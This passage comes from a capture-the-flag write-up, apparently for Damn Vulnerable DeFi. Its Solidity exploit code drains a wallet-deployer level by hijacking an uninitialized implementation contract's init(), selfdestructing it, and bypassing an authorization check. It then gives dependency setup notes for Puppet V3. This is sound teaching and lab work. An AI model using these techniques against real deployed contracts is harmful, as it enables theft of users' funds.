As we know the sender, we need to find out the hash by bruteforcing it:

```solidity
for (uint8 i = 0; i < 100; i++) {
  wallet = factory.createProxy(address(attacker), "");
  if ((address(wallet)) == 0x9B6fb606A9f5789444c17768c6dFCF2f83563801) {
    break;
  }
}
```

With the found nonce, we create the attacking wallet, and perform the actual draining:

```solidity
vm.setNonce(address(factory), 43);
wallet = factory.createProxy(address(attacker), "");

// Now that we have control of this address, we can drain its funds.
AttackerWallet(address(wallet))
  .transfer(
    address(level.token()),
    level.playerAddress(),
    level.DEPOSIT_TOKEN_AMOUNT());
```

#### Drain the walletDeployer contract.

The attack exploits this check made by the `can()` function, after calling the authorizer proxy

```solidity
if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
```

The logic of this line can be seen as

```
              +---------------------------+
              | Is `returndatasize` != 0? |
              +---------------------------+
          No                | Yes
          |                 V
 +---------------------+   +---------------------------------------+
 | Pass (move forward) |   | Did the `can` function return `true`? |
 +---------------------+   +---------------------------------------+
                           | No             | Yes
                           V                V
              +------------------+    +---------------------+
              | Return `0`       |    | Pass (move forward) |
              +------------------+    +---------------------+
```

Then, if we find a way for the proxy to not return data, we can bypass the control at `can()`, suceeding in draining the walletDeployer via the `drop()` function.

Let's review the implementation contract in the proxy. The `init()` function is called via the proxy. Due to the `initializer` modifier, it operates within the proxy's storage context, allowing the function to be invoked directly on the contract.

Open Zeppelin advises:

1. Make all initializers idempotent.
2. To secure the `init()` in the implementation contract against direct use, invoke `_disableInitializers` in the constructor to lock it at deployment.

The implementation contract is thus vulnerable to an attacker calling `init()`, which, among other things, will give ownership of the contract to the caller.

```solidity
AuthorizerUpgradeable authorizer = AuthorizerUpgradeable(address(level.implementation()));
address[] memory param01 = new address[](1);
param01[0] = 0x0000000000000000000000000000000000000000;
address[] memory param02 = new address[](1);
param02[0] = 0x0000000000000000000000000000000000000000;
authorizer.init(param01, param02);
```

After becoming owners via `init()`, we can call `upgradeToAndCall()`. This function makes a delegate call to the provided function. If `selfdestruct()` is called within this function, it will destroy the implementation contract, not the proxy.

Thus, when the walletDeployer invokes the proxy, the proxy then makes a delegate call to the implementation contract:

```solidity
   let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
```

Since the implementation was just destroyed, this `delegatecall` will fail (not revert), and the proxy function will produce a `returndatasize` of zero. This outcome enables us to bypass the check and drain the contract.


Finally we just invoke `drop()` to complete the level.

### References

* https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY
* https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md
* https://docs.openzeppelin.com/contracts/4.x/api/proxy

## 14 Puppet V3

### Setup notes

#### Dependency fix

Tried to remap, but in the end we needed to update the dependencies at ``:

```solidity
import '@openzeppelin/contracts/token/ERC721/IERC721Metadata.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Enumerable.sol';
```

to

```solidity
import '@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol';
import '@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol';
```

#### Conversion at `PoolAddress.sol`

See issue: https://github.com/Uniswap/v3-periphery/pull/271

Moved from `uint256` to an additional cast to `uint160`.
